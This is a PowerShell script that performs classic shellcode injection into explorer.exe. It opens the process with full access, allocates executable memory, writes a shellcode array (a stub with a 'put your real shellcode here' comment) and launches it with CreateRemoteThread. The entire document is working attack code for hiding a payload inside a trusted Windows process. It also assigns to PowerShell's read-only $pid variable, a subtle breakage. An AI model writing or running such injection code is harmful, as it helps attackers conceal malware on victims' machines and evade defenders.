# Define Win32 API functions
$code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, out UInt32 lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

# Add the API to PowerShell
Add-Type -TypeDefinition $code

# --- Get explorer.exe PID ---
$process = Get-Process -Name explorer | Select-Object -First 1
$pid = $process.Id
Write-Host "[*] Target PID: $pid"

# --- Set up shellcode here ---
[Byte[]]$sc = [Byte[]] (
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00 # <= <--- Put your real shellcode here
    # Shellcode continues...
)

# --- Open explorer.exe process ---
$PROCESS_ALL_ACCESS = 0x001F0FFF
$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)

if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to open process."
    exit
}

Write-Host "[+] Opened process handle: $hProcess"

# --- Allocate memory inside explorer.exe ---
$MEM_COMMIT = 0x1000
$PAGE_EXECUTE_READWRITE = 0x40
$size = $sc.Length

$addr = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)

if ($addr -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to allocate memory."
    [Win32]::CloseHandle($hProcess)
    exit
}

Write-Host "[+] Allocated memory at: $addr"

# --- Write shellcode into memory ---
$written = 0
$result = [Win32]::WriteProcessMemory($hProcess, $addr, $sc, $size, [ref]$written)

if (-not $result -or $written -ne $size) {
    Write-Error "[-] Failed to write shellcode into memory."
    [Win32]::CloseHandle($hProcess)
    exit
}

Write-Host "[+] Wrote $written bytes into memory."

# --- Create remote thread to execute shellcode ---
$hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

if ($hThread -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to create remote thread."
    [Win32]::CloseHandle($hProcess)
    exit
}

Write-Host "[+] Remote thread created successfully!"

# --- Clean up ---
[Win32]::CloseHandle($hProcess)
Write-Host "[*] Done."
